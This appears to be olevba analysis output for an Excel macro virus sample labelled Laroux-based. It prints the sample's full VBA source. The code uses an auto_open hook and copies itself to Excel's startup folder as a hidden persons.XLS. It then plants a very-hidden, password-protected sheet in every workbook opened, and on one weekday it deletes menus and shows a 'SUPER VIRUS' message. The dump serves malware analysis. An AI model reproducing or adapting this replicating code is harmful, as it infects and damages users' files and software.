olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-a01806c08751bf9a3ed7fcaa35049102d247bb09
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO persons.bas 
in file: Virus.MSExcel.Laroux-based-a01806c08751bf9a3ed7fcaa35049102d247bb09 - OLE stream: '_VBA_PROJECT_CUR/VBA/persons'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "inflecting"
End Sub

Sub inflecting()
Attribute inflecting.VB_ProcData.VB_Invoke_Func = " \n14"
    strtpth = Application.StartupPath
    ifexist = Dir(strtpth & "\" & "persons.XLS")
    If ifexist = "persons.XLS" Then ext = 1 Else ext = 0
    If ActiveWorkbook.Modules.Count > 0 Then modnum = 1 Else modnum = 0
    whichfile = ext + modnum * 10
    If ActiveWorkbook.Name = "persons.xls" Then
    ActiveWorkbook.Visible = xlveryhide
   Else
    End If
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    actbok = ActiveWorkbook.Name
    Sheets("persons").Visible = True
    Sheets("persons").Select
  '  Sheets("persons").Copy
  '  With ActiveWorkbook
  '      .Title = ""
  '      .Subject = ""
  '      .Author = ""
  '      .Keywords = ""
  '      .Comments = ""
  '  End With
    newname = ActiveWorkbook.Name
    CurDire = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = xlveryhide
    Workbooks(newname).SaveAs FileName:=Application.StartupPath & "/" & "persons.XLS", FileFormat:=xlNormal _
        , password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    Workbooks("persons.xls").Close
     days
     Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "persons.XLS!inflecting"
    Case 1
    Application.ScreenUpdating = False
    actbok = ActiveWorkbook.Name
    ACTBOKPTH = ActiveWorkbook.Path
    firshtnm = Workbooks(actbok).Sheets(1).Name
    If firshtnm <> "persons" Then
        Workbooks("persons.XLS").Sheets("persons").Copy before:=Workbooks(actbok).Sheets(1)
        Workbooks(actbok).Sheets("persons").Visible = xlveryhide
        Sheets("persons").Protect password:="xls"
    Else
    End If
days
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "persons.XLS!inflecting"
    Case Else
days
End Select
End Sub


Sub days()
Attribute days.VB_ProcData.VB_Invoke_Func = " \n14"
a = WeekDay(Now) - 1
If a = 5 Then
    MenuBars(xlWorksheet).Reset
    MenuBars(xlModule).Reset
    MenuBars(xlWorksheet).Menus("&File").Delete
    MenuBars(xlWorksheet).Menus("&Edit").Delete
    MenuBars(xlWorksheet).Menus("&View").Delete
    MenuBars(xlWorksheet).Menus("&Format").Delete
    MenuBars(xlWorksheet).Menus("&Tools").Delete
    MenuBars(xlWorksheet).Menus("&Data").Delete
    MenuBars(xlWorksheet).Menus("&Window").Delete
    MenuBars(xlModule).Menus("&File").Delete
    MenuBars(xlModule).Menus("&Window").Delete
    MenuBars(xlModule).Menus("&Run").Delete
    MenuBars(xlModule).Menus("&Edit").Delete
    MenuBars(xlModule).Menus("&View").Delete
    MenuBars(xlModule).Menus("&Insert").Delete
    MenuBars(xlModule).Menus("&Tools").Delete
     MsgBox "EXCELLENT !!!!!@@@ " & Chr(13) & "goodluck" & Chr(13) & "You have already infected by" & Chr(13) & "SUPER VIRUS!!!"
    b = Now
    MsgBox b & "   is the  " & a & "th  day of this week"
Else
    MenuBars(xlWorksheet).Reset
    MenuBars(xlModule).Reset
    MenuBars(xlWorksheet).Menus("&Window").Enabled = False
    MenuBars(xlWorksheet).Menus("&format").MenuItems("&sheet").Delete
    MenuBars(xlModule).Menus("window").Enabled = False
End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  person
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

